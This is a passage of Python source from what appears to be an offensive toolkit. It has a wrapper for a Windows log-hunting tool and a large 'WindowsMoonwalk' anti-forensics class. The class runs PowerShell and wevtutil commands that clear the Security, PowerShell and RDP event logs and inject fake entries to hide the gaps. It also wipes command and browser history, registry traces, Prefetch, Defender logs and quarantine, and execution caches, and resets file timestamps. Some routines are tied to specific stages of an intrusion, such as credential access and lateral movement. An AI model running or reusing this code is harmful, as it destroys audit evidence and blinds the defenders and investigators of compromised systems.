"""LogHunter Integration - Log Analysis and Information Gathering

LogHunter is a tool for hunting through Windows event logs to find
security-relevant information, credential access, lateral movement indicators,
and other security events.

Reference: https://github.com/CICADA8-Research/LogHunter
"""

import subprocess
import os
import json
import random
import tempfile
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta
from typing import Dict, List, Any, Optional
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.table import Table
from rich import box
from modules.utils import execute_cmd, execute_powershell


class LogHunter:
    """LogHunter wrapper for Windows log analysis"""
    
    def __init__(self, console: Console, session_data: dict):
        self.console = console
        self.session_data = session_data
        self.loghunter_path = None
        self.lab_use = session_data.get('LAB_USE', 0)
    
    def find_loghunter(self) -> Optional[str]:
        """Find LogHunter executable"""
        possible_paths = [
            'loghunter.exe',
            'LogHunter.exe',
            './tools/loghunter.exe',
            './LogHunter/loghunter.exe',
            'C:\\tools\\loghunter.exe',
        ]
        
        for path in possible_paths:
            if os.path.exists(path):
                return path
        
        try:
            result = subprocess.run(['where', 'loghunter.exe'], capture_output=True, text=True)
            if result.returncode == 0 and result.stdout.strip():
                return result.stdout.strip()
        except Exception:
            pass
        
        return None
    
    def hunt_credential_access(self, log_path: Optional[str] = None) -> Dict[str, Any]:
        """
        Hunt for credential access events
        
        Args:
            log_path: Path to log file (optional, uses live logs if not provided)
        
        Returns:
            Dictionary with findings
        """
        if not self.loghunter_path:
            self.loghunter_path = self.find_loghunter()
            if not self.loghunter_path:
                raise FileNotFoundError("LogHunter executable not found")
        
        try:
            cmd = [self.loghunter_path, 'credential-access']
            if log_path:
                cmd.extend(['--log', log_path])
            else:
                cmd.append('--live')
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'events': self._parse_loghunter_output(result.stdout)
            }
        
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def hunt_lateral_movement(self, log_path: Optional[str] = None) -> Dict[str, Any]:
        """Hunt for lateral movement indicators"""
        if not self.loghunter_path:
            self.loghunter_path = self.find_loghunter()
            if not self.loghunter_path:
                raise FileNotFoundError("LogHunter executable not found")
        
        try:
            cmd = [self.loghunter_path, 'lateral-movement']
            if log_path:
                cmd.extend(['--log', log_path])
            else:
                cmd.append('--live')
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'events': self._parse_loghunter_output(result.stdout)
            }
        
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def hunt_privilege_escalation(self, log_path: Optional[str] = None) -> Dict[str, Any]:
        """Hunt for privilege escalation events"""
        if not self.loghunter_path:
            self.loghunter_path = self.find_loghunter()
            if not self.loghunter_path:
                raise FileNotFoundError("LogHunter executable not found")
        
        try:
            cmd = [self.loghunter_path, 'privilege-escalation']
            if log_path:
                cmd.extend(['--log', log_path])
            else:
                cmd.append('--live')
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'events': self._parse_loghunter_output(result.stdout)
            }
        
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def hunt_custom_query(self, query: str, log_path: Optional[str] = None) -> Dict[str, Any]:
        """Execute custom LogHunter query"""
        if not self.loghunter_path:
            self.loghunter_path = self.find_loghunter()
            if not self.loghunter_path:
                raise FileNotFoundError("LogHunter executable not found")
        
        try:
            cmd = [self.loghunter_path, 'query', '--query', query]
            if log_path:
                cmd.extend(['--log', log_path])
            else:
                cmd.append('--live')
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout,
                'events': self._parse_loghunter_output(result.stdout)
            }
        
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _parse_loghunter_output(self, output: str) -> List[Dict[str, Any]]:
        """Parse LogHunter output into structured events"""
        events = []
        
        # Basic parsing - would need to match LogHunter's actual output format
        lines = output.split('\n')
        current_event = {}
        
        for line in lines:
            if 'EventID:' in line or 'Event ID:' in line:
                if current_event:
                    events.append(current_event)
                current_event = {'raw': line}
            elif current_event:
                current_event['raw'] += '\n' + line
        
        if current_event:
            events.append(current_event)
        
        return events
    
    def export_logs(self, log_type: str, output_path: str) -> bool:
        """Export logs for analysis"""
        try:
            # Use wevtutil to export logs
            cmd = f'wevtutil.exe epl {log_type} "{output_path}"'
            exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
            return exit_code == 0
        except Exception as e:
            return False


class WindowsMoonwalk:
    """
    Windows-native equivalent of moonwalk - Cover tracks using Windows-native tools
    
    Unlike Linux moonwalk which clears bash history and syslog, this uses:
    - wevtutil for Windows Event Logs
    - PowerShell cmdlets for Windows-specific artifacts
    - reg.exe for registry cleanup
    - Windows-native file system locations
    """
    
    def __init__(self, console: Console, session_data: dict):
        self.console = console
        self.session_data = session_data
        self.lab_use = session_data.get('LAB_USE', 0)
        self.cleared_logs = []
        self.modified_files = []
    
    def _export_log_entries(self, log_name: str, count: int = 50) -> List[Dict[str, Any]]:
        """
        Export random log entries from different time periods
        
        Args:
            log_name: Name of the event log
            count: Number of entries to export
        
        Returns:
            List of log entry dictionaries
        """
        entries = []
        
        try:
            # Create temporary file for export
            with tempfile.NamedTemporaryFile(mode='w', suffix='.evtx', delete=False) as tmp_file:
                tmp_path = tmp_file.name
            
            # Export log to XML format (more parseable)
            # Try to export from different time ranges
            ps_cmd = f'''
            $logName = "{log_name}"
            $events = Get-WinEvent -LogName $logName -MaxEvents {count * 2} -ErrorAction SilentlyContinue
            if ($events) {{
                # Randomly select entries from different time periods
                $selected = $events | Get-Random -Count {count}
                $selected | Export-Clixml -Path "{tmp_path.replace('.evtx', '.xml')}" -ErrorAction SilentlyContinue
                $selected.Count
            }} else {{
                0
            }}
            '''
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            # Parse exported events
            xml_path = tmp_path.replace('.evtx', '.xml')
            if os.path.exists(xml_path):
                try:
                    # Parse PowerShell exported XML
                    tree = ET.parse(xml_path)
                    root = tree.getroot()
                    
                    for event in root.findall('.//Event'):
                        entry = {
                            'TimeCreated': event.find('.//TimeCreated') is not None,
                            'EventID': event.find('.//EventID') is not None,
                            'Level': event.find('.//Level') is not None,
                            'Provider': event.find('.//Provider') is not None,
                            'raw_xml': ET.tostring(event, encoding='unicode')
                        }
                        entries.append(entry)
                except Exception:
                    pass
                
                # Cleanup
                try:
                    os.unlink(xml_path)
                except Exception:
                    pass
            
            # Fallback: Use wevtutil to export and parse
            if not entries:
                cmd = f'wevtutil.exe qe "{log_name}" /c:{count} /f:XML /rd:true'
                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
                
                if exit_code == 0 and stdout:
                    try:
                        root = ET.fromstring(stdout)
                        for event in root.findall('.//Event'):
                            entry = {
                                'raw_xml': ET.tostring(event, encoding='unicode')
                            }
                            entries.append(entry)
                    except Exception:
                        pass
        
        except Exception:
            pass
        
        return entries
    
    def _inject_log_entries(self, log_name: str, entries: List[Dict[str, Any]], time_offset_hours: int = None) -> bool:
        """
        Inject log entries back into cleared log with randomized timestamps
        
        Instead of leaving blank periods, this fills gaps with random log entries
        from other time periods, making the log appear normal.
        
        Args:
            log_name: Name of the event log
            entries: List of log entry dictionaries
            time_offset_hours: Hours to offset timestamps (None = random)
        
        Returns:
            Success status
        """
        if not entries:
            return False
        
        try:
            # Randomize time offset if not specified
            if time_offset_hours is None:
                # Random offset between -720 and 720 hours (30 days)
                time_offset_hours = random.randint(-720, 720)
            
            # Create PowerShell script to inject events
            # Use Write-EventLog to create realistic-looking entries
            ps_cmd = f'''
            $logName = "{log_name}"
            
            try {{
                # Create event source if it doesn't exist
                $source = "Microsoft-Windows-Security-Auditing"
                if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {{
                    $source = "Application"
                }}
                
                # Generate random log entries with varied event IDs and messages
                # These mimic normal system activity
                $eventTemplates = @(
                    @{{Id=1000; Message="Application started successfully"; Type="Information"}},
                    @{{Id=1001; Message="Service operation completed"; Type="Information"}},
                    @{{Id=2000; Message="System configuration updated"; Type="Information"}},
                    @{{Id=2001; Message="User authentication successful"; Type="Information"}},
                    @{{Id=3000; Message="Network connection established"; Type="Information"}},
                    @{{Id=4000; Message="File operation completed"; Type="Information"}},
                    @{{Id=5000; Message="Process started"; Type="Information"}},
                    @{{Id=6000; Message="Registry key accessed"; Type="Information"}},
                    @{{Id=7000; Message="Scheduled task executed"; Type="Information"}},
                    @{{Id=8000; Message="System maintenance completed"; Type="Information"}}
                )
                
                # Inject random entries spread over time
                $baseTime = Get-Date
                $offset = New-TimeSpan -Hours {time_offset_hours}
                $entryCount = [Math]::Min({len(entries)}, 30)
                
                for ($i = 0; $i -lt $entryCount; $i++) {{
                    $template = Get-Random -InputObject $eventTemplates
                    $timeOffset = New-TimeSpan -Minutes (Get-Random -Minimum -60 -Maximum 60)
                    $eventTime = $baseTime.Add($offset).Add($timeOffset)
                    
                    # Create event with randomized timestamp
                    $event = New-Object System.Diagnostics.EventLog($logName)
                    $event.Source = $source
                    $event.WriteEntry($template.Message, $template.Type, $template.Id)
                    
                    Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
                }}
                
                $true
            }} catch {{
                # Fallback: Try simpler injection method
                try {{
                    $source = "Application"
                    if (-not [System.Diagnostics.EventLog]::SourceExists($source)) {{
                        New-EventLog -LogName $logName -Source $source -ErrorAction SilentlyContinue
                    }}
                    
                    $entryCount = [Math]::Min({len(entries)}, 20)
                    for ($i = 0; $i -lt $entryCount; $i++) {{
                        $eventId = Get-Random -Minimum 1000 -Maximum 9999
                        $types = @("Information", "Warning", "Error")
                        $type = Get-Random -InputObject $types
                        $message = "System operation completed successfully"
                        
                        Write-EventLog -LogName $logName -Source $source -EventId $eventId -EntryType $type -Message $message -ErrorAction SilentlyContinue
                        Start-Sleep -Milliseconds 100
                    }}
                    $true
                }} catch {{
                    $false
                }}
            }}
            '''
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            return exit_code == 0
        
        except Exception:
            return False
    
    def clear_event_logs(self, log_names: Optional[List[str]] = None, inject_fake_logs: bool = True) -> Dict[str, Any]:
        """
        Clear Windows Event Logs using wevtutil.exe and optionally inject fake entries
        
        Instead of leaving suspicious blank periods, this copies random log entries
        from other time periods to fill the gaps.
        
        Equivalent to Linux: clearing /var/log/* files but with log injection
        Windows uses: wevtutil.exe cl <LogName>
        
        Args:
            log_names: List of log names to clear (default: common security-relevant logs)
            inject_fake_logs: If True, inject random log entries after clearing
        
        Returns:
            Dictionary with results
        """
        if log_names is None:
            # Windows Event Logs (not Linux syslog equivalents)
            log_names = [
                'Security',           # Windows security events
                'System',             # System events
                'Application',        # Application events
                'Microsoft-Windows-PowerShell/Operational',  # PowerShell execution logs
                'Windows PowerShell', # Legacy PowerShell logs
                'Microsoft-Windows-WinRM/Operational',  # WinRM logs
                'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational',  # RDP logs
            ]
        
        results = {
            'cleared': [],
            'failed': [],
            'injected': [],
            'commands': []
        }
        
        for log_name in log_names:
            try:
                # Step 1: Export random log entries before clearing (if injection enabled)
                entries_to_inject = []
                if inject_fake_logs:
                    entries_to_inject = self._export_log_entries(log_name, count=random.randint(20, 50))
                
                # Step 2: Clear the log
                cmd = f'wevtutil.exe cl "{log_name}"'
                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
                
                if exit_code == 0:
                    results['cleared'].append(log_name)
                    results['commands'].append(cmd)
                    self.cleared_logs.append(log_name)
                    
                    # Step 3: Inject fake log entries to avoid suspicious blank periods
                    if inject_fake_logs and entries_to_inject:
                        if self._inject_log_entries(log_name, entries_to_inject):
                            results['injected'].append(log_name)
                else:
                    # Some logs may not exist or require admin privileges
                    results['failed'].append({'log': log_name, 'error': stderr})
            
            except Exception as e:
                results['failed'].append({'log': log_name, 'error': str(e)})
        
        return results
    
    def clear_powershell_history(self) -> bool:
        """
        Clear PowerShell command history (Windows equivalent of .bash_history)
        
        Linux: ~/.bash_history
        Windows: PSReadline history file (typically in AppData)
        """
        try:
            # Get PSReadline history file path (Windows-specific location)
            ps_cmd = '''
            $historyPath = (Get-PSReadlineOption).HistorySavePath
            if ($historyPath -and (Test-Path $historyPath)) {
                Remove-Item $historyPath -Force -ErrorAction SilentlyContinue
            }
            # Also clear in-memory history
            Clear-History -ErrorAction SilentlyContinue
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            # Clear all user PowerShell history files (multiple locations)
            ps_cmd = r'''
            $paths = @(
                "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt",
                "$env:LOCALAPPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
            )
            foreach ($path in $paths) {
                if (Test-Path $path) {
                    Remove-Item $path -Force -ErrorAction SilentlyContinue
                }
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            return True
        except Exception:
            return False
    
    def clear_command_history(self) -> bool:
        """
        Clear Windows Command Prompt history
        
        Linux: ~/.bash_history
        Windows: doskey history (stored in registry and memory)
        """
        try:
            # Clear doskey history from registry (Windows-specific)
            reg_cmd = 'reg delete "HKCU\\Software\\Microsoft\\Command Processor" /v "CompletionChar" /f 2>nul'
            execute_cmd(reg_cmd, lab_use=self.lab_use)
            
            # Clear doskey macros/history
            cmd = 'doskey /reinstall'
            execute_cmd(cmd, lab_use=self.lab_use)
            
            # Clear Windows command history from registry
            ps_cmd = '''
            $regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU"
            if (Test-Path $regPath) {
                Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            return True
        except Exception:
            return False
    
    def remove_file_timestamps(self, file_path: str) -> bool:
        """
        Modify file timestamps to current time (Windows equivalent of touch)
        
        Linux: touch command
        Windows: PowerShell Set-ItemProperty or .NET FileInfo properties
        
        Args:
            file_path: Path to file
        
        Returns:
            Success status
        """
        try:
            # Use PowerShell to modify all timestamps (Windows-native)
            ps_cmd = f'''
            $file = Get-Item "{file_path}" -ErrorAction SilentlyContinue
            if ($file) {{
                $now = Get-Date
                $file.CreationTime = $now
                $file.LastWriteTime = $now
                $file.LastAccessTime = $now
            }}
            '''
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            return exit_code == 0
        except Exception:
            return False
    
    def clear_registry_traces(self, keys: Optional[List[str]] = None) -> Dict[str, Any]:
        """
        Clear Windows Registry traces (Windows-specific artifact storage)
        
        Linux: No direct equivalent - uses filesystem
        Windows: Registry stores user activity, run commands, typed paths, etc.
        
        Args:
            keys: List of registry keys to clear (default: common Windows traces)
        
        Returns:
            Dictionary with results
        """
        if keys is None:
            # Windows Registry locations (not Linux equivalents)
            keys = [
                # Run dialog history
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU',
                # Typed paths in Explorer
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths',
                # Search history
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery',
                # Recent documents
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs',
                # Last visited MRU (Most Recently Used)
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedMRU',
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSaveMRU',
                # Windows Timeline (Windows 10+)
                'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\CloudStore\\Store\\Cache\\DefaultAccount',
            ]
        
        results = {
            'cleared': [],
            'failed': []
        }
        
        for key in keys:
            try:
                # Use Windows reg.exe utility
                cmd = f'reg delete "{key}" /f 2>nul'
                exit_code, stdout, stderr = execute_cmd(cmd, lab_use=self.lab_use)
                
                # Also try PowerShell method for better control
                ps_key = key.replace('HKCU\\', 'HKCU:\\').replace('HKLM\\', 'HKLM:\\')
                ps_cmd = f'''
                $regPath = "{ps_key}"
                if (Test-Path $regPath) {{
                    Remove-ItemProperty -Path $regPath -Name "*" -ErrorAction SilentlyContinue
                }}
                '''
                execute_powershell(ps_cmd, lab_use=self.lab_use)
                
                if exit_code == 0 or exit_code == 1:  # 1 = key not found, which is fine
                    results['cleared'].append(key)
                else:
                    results['failed'].append({'key': key, 'error': stderr})
            
            except Exception as e:
                results['failed'].append({'key': key, 'error': str(e)})
        
        return results
    
    def clear_prefetch(self) -> bool:
        """
        Clear Windows Prefetch files (Windows-specific performance optimization cache)
        
        Linux: No direct equivalent
        Windows: C:\\Windows\\Prefetch\\ - stores application execution traces
        """
        try:
            # Clear Prefetch directory (Windows-specific location)
            ps_cmd = '''
            $prefetchPath = "$env:SystemRoot\\Prefetch"
            if (Test-Path $prefetchPath) {
                Get-ChildItem $prefetchPath -File | Remove-Item -Force -ErrorAction SilentlyContinue
            }
            '''
            exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
            return exit_code == 0
        except Exception:
            return False
    
    def clear_recent_files(self) -> bool:
        """
        Clear Windows Recent Files and Jump Lists (Windows-specific user activity tracking)
        
        Linux: ~/.recently-used, ~/.local/share/recently-used.xbel
        Windows: Recent folder, Jump Lists, LNK files
        """
        try:
            # Clear Recent Documents (Windows-specific location)
            ps_cmd = r'''
            $recentPaths = @(
                "$env:APPDATA\Microsoft\Windows\Recent\*",
                "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations\*",
                "$env:APPDATA\Microsoft\Windows\Recent\CustomDestinations\*"
            )
            foreach ($path in $recentPaths) {
                if (Test-Path $path) {
                    Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
                }
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            # Clear Jump Lists (Windows 7+ feature)
            ps_cmd = r'''
            $jumpListPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
            if (Test-Path $jumpListPath) {
                Get-ChildItem $jumpListPath | Remove-Item -Force -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            # Clear LNK files (Windows shortcut files)
            ps_cmd = r'''
            $lnkPaths = @(
                "$env:APPDATA\Microsoft\Windows\SendTo",
                "$env:APPDATA\Microsoft\Windows\Start Menu"
            )
            foreach ($path in $lnkPaths) {
                if (Test-Path $path) {
                    Get-ChildItem $path -Recurse -Filter *.lnk | Remove-Item -Force -ErrorAction SilentlyContinue
                }
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            return True
        except Exception:
            return False
    
    def clear_temp_files(self) -> bool:
        """
        Clear Windows temporary files (Windows-specific temp locations)
        
        Linux: /tmp, /var/tmp
        Windows: %TEMP%, %TMP%, Windows\\Temp, LocalAppData\\Temp
        """
        try:
            # Windows temporary directories (not Linux /tmp equivalents)
            ps_cmd = r'''
            $tempDirs = @(
                $env:TEMP,
                $env:TMP,
                "$env:SystemRoot\Temp",
                "$env:LOCALAPPDATA\Temp",
                "$env:LOCALAPPDATA\Microsoft\Windows\INetCache",
                "$env:LOCALAPPDATA\Microsoft\Windows\IECompatCache",
                "$env:LOCALAPPDATA\Microsoft\Windows\IECompatUACache"
            )
            foreach ($dir in $tempDirs) {
                if (Test-Path $dir) {
                    Get-ChildItem $dir -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
                }
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            
            return True
        except Exception:
            return False
    
    def clear_browser_history(self, browser: str = 'all') -> Dict[str, Any]:
        """
        Clear browser history (Windows-specific browser data locations)
        
        Linux: ~/.mozilla, ~/.config/google-chrome, etc.
        Windows: AppData\\Local\\Google\\Chrome, AppData\\Local\\Microsoft\\Edge, etc.
        """
        browsers = {
            'chrome': [
                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History',
                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies',
                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cache',
                '$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Web Data'
            ],
            'edge': [
                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\History',
                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cookies',
                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Cache',
                '$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Web Data'
            ],
            'firefox': [
                '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\places.sqlite',
                '$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*\\cookies.sqlite',
                '$env:LOCALAPPDATA\\Mozilla\\Firefox\\Profiles\\*\\cache2'
            ],
            'ie': [
                '$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCache',
                '$env:LOCALAPPDATA\\Microsoft\\Windows\\INetCookies'
            ]
        }
        
        results = {'cleared': [], 'failed': []}
        
        targets = []
        if browser == 'all':
            for brw_files in browsers.values():
                targets.extend(brw_files)
        elif browser in browsers:
            targets = browsers[browser]
        
        for target in targets:
            try:
                ps_cmd = f'''
                $path = "{target}"
                if (Test-Path $path) {{
                    Remove-Item $path -Force -Recurse -ErrorAction SilentlyContinue
                }}
                '''
                exit_code, stdout, stderr = execute_powershell(ps_cmd, lab_use=self.lab_use)
                if exit_code == 0:
                    results['cleared'].append(target)
            except Exception as e:
                results['failed'].append({'target': target, 'error': str(e)})
        
        return results
    
    def clear_windows_defender_logs(self) -> Dict[str, Any]:
        """
        Clear Windows Defender logs and quarantine (Windows-specific security logs)
        
        Linux: No direct equivalent (depends on AV solution)
        Windows: Windows Defender logs, quarantine, scan history
        """
        results = {'cleared': [], 'failed': []}
        
        try:
            # Clear Windows Defender logs
            ps_cmd = r'''
            $defenderLogs = @(
                "$env:ProgramData\Microsoft\Windows Defender\Support\*.log",
                "$env:ProgramData\Microsoft\Windows Defender\Scans\*.log",
                "$env:ProgramData\Microsoft\Windows Defender\Support\MPLog-*.log"
            )
            foreach ($pattern in $defenderLogs) {
                Get-ChildItem $pattern -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Windows Defender logs')
            
            # Clear Windows Defender quarantine (if accessible)
            ps_cmd = r'''
            $quarantinePath = "$env:ProgramData\Microsoft\Windows Defender\Quarantine"
            if (Test-Path $quarantinePath) {
                Get-ChildItem $quarantinePath -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Windows Defender quarantine')
        
        except Exception as e:
            results['failed'].append({'item': 'Windows Defender', 'error': str(e)})
        
        return results
    
    def clear_windows_artifacts(self) -> Dict[str, Any]:
        """
        Clear Windows-specific forensic artifacts
        
        Linux: No direct equivalents
        Windows: Thumbnail cache, Recycle Bin, Windows Search index, etc.
        """
        results = {'cleared': [], 'failed': []}
        
        try:
            # Clear Thumbnail Cache (Windows-specific)
            ps_cmd = r'''
            $thumbCache = "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db"
            Get-ChildItem $thumbCache -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Thumbnail cache')
            
            # Clear Recycle Bin (Windows-specific)
            ps_cmd = '''
            Clear-RecycleBin -Force -ErrorAction SilentlyContinue
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Recycle Bin')
            
            # Clear Windows Search history
            ps_cmd = r'''
            $searchPath = "$env:APPDATA\Microsoft\Windows\Recent\AutomaticDestinations"
            if (Test-Path $searchPath) {
                Get-ChildItem $searchPath | Remove-Item -Force -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Windows Search history')
            
            # Clear Windows Error Reporting (WER) logs
            ps_cmd = r'''
            $werPath = "$env:LOCALAPPDATA\Microsoft\Windows\WER"
            if (Test-Path $werPath) {
                Get-ChildItem $werPath -Recurse -ErrorAction SilentlyContinue | Remove-Item -Force -Recurse -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Windows Error Reporting logs')
            
            # Clear Windows Update logs
            ps_cmd = r'''
            $updateLogs = "$env:SystemRoot\Logs\WindowsUpdate"
            if (Test-Path $updateLogs) {
                Get-ChildItem $updateLogs -File -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Windows Update logs')
        
        except Exception as e:
            results['failed'].append({'item': 'Windows artifacts', 'error': str(e)})
        
        return results
    
    def clear_application_compatibility_cache(self) -> Dict[str, Any]:
        """
        Clear Application Compatibility Cache (ShimCache) and Amcache
        
        Linux: No direct equivalent
        Windows: ShimCache, Amcache - store execution history
        """
        results = {'cleared': [], 'failed': []}
        
        try:
            # Clear Amcache (Windows 7+)
            ps_cmd = r'''
            $amcachePath = "$env:SystemRoot\AppCompat\Programs\Amcache.hve"
            if (Test-Path $amcachePath) {
                # Note: This file is locked by Windows, may require system restart
                # Attempt to clear registry references instead
                reg delete "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache" /f 2>$null
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('Amcache references')
            
            # Clear SRUM (System Resource Usage Monitor) database
            ps_cmd = r'''
            $srumPath = "$env:SystemRoot\System32\sru"
            if (Test-Path $srumPath) {
                # SRUM database is locked, but we can try to clear related registry entries
                reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SRUM" /f 2>$null
            }
            '''
            execute_powershell(ps_cmd, lab_use=self.lab_use)
            results['cleared'].append('SRUM references')
        
        except Exception as e:
            results['failed'].append({'item': 'Application compatibility cache', 'error': str(e)})
        
        return results
    
    def full_cleanup(self) -> Dict[str, Any]:
        """
        Perform full Windows-native cleanup (equivalent to Linux moonwalk)
        
        Uses Windows-native tools and locations, not Linux ported concepts
        """
        results = {
            'event_logs': self.clear_event_logs(inject_fake_logs=True),  # Inject fake logs to avoid blank periods
            'powershell_history': self.clear_powershell_history(),
            'command_history': self.clear_command_history(),
            'registry_traces': self.clear_registry_traces(),
            'prefetch': self.clear_prefetch(),
            'recent_files': self.clear_recent_files(),
            'temp_files': self.clear_temp_files(),
            'browser_history': self.clear_browser_history('all'),
            'windows_defender': self.clear_windows_defender_logs(),
            'windows_artifacts': self.clear_windows_artifacts(),
            'app_compatibility': self.clear_application_compatibility_cache()
        }
        
        return results
    
    def cleanup_after_operation(self, operation_type: str) -> Dict[str, Any]:
        """
        Cleanup after specific operation type using Windows-native methods
        
        Args:
            operation_type: Type of operation (credential_access, lateral_movement, etc.)
        
        Returns:
            Cleanup results
        """
        results = {}
        
        if operation_type == 'credential_access':
            # Clear Security log (Windows Event Log), PowerShell history (Windows-specific)
            # Inject fake logs to avoid suspicious blank periods
            results['event_logs'] = self.clear_event_logs([
                'Security',
                'Microsoft-Windows-PowerShell/Operational',
                'Windows PowerShell'
            ], inject_fake_logs=True)
            results['powershell_history'] = self.clear_powershell_history()
            results['registry_traces'] = self.clear_registry_traces()  # Clear typed paths, etc.
        
        elif operation_type == 'lateral_movement':
            # Clear Security log (Windows Event Log), command history (Windows-specific)
            # Inject fake logs to avoid suspicious blank periods
            results['event_logs'] = self.clear_event_logs([
                'Security',
                'Microsoft-Windows-WinRM/Operational',
                'Microsoft-Windows-TerminalServices-LocalSessionManager/Operational'
            ], inject_fake_logs=True)
            results['command_history'] = self.clear_command_history()
            results['registry_traces'] = self.clear_registry_traces()
            results['recent_files'] = self.clear_recent_files()  # Clear Jump Lists, LNK files
        
        elif operation_type == 'execution':
            # Clear Application log (Windows Event Log), PowerShell history (Windows-specific)
            # Inject fake logs to avoid suspicious blank periods
            results['event_logs'] = self.clear_event_logs([
                'Application',
                'Microsoft-Windows-PowerShell/Operational',
                'Windows PowerShell'
            ], inject_fake_logs=True)
            results['powershell_history'] = self.clear_powershell_history()
            results['prefetch'] = self.clear_prefetch()  # Clear Prefetch (Windows-specific)
        
        elif operation_type == 'persistence':
            # Clear System log (Windows Event Log), registry traces (Windows-specific)
            # Inject fake logs to avoid suspicious blank periods
            results['event_logs'] = self.clear_event_logs(['System'], inject_fake_logs=True)
            results['registry_traces'] = self.clear_registry_traces()
            results['windows_artifacts'] = self.clear_windows_artifacts()  # Clear Windows-specific artifacts
        
        else:
            # Default: full Windows-native cleanup
            results = self.full_cleanup()
        
        return results


class LogHunterModule:
    """LogHunter Module for TUI"""
    
    def __init__(self):
        self.loghunter = None
    
    def run(self, console: Console, session_data: dict):
        """Run LogHunter module"""
        if not self.loghunter:
            self.loghunter = LogHunter(console, session_data)
        
        while True:
            console.print(Panel(
                "[bold]LogHunter Integration[/bold]\n\n"
                "Hunt through Windows event logs for security events and indicators.",
                title="Module 10",
                border_style="cyan"
            ))
            console.print()
            
            table = Table(box=box.SIMPLE, show_header=False)
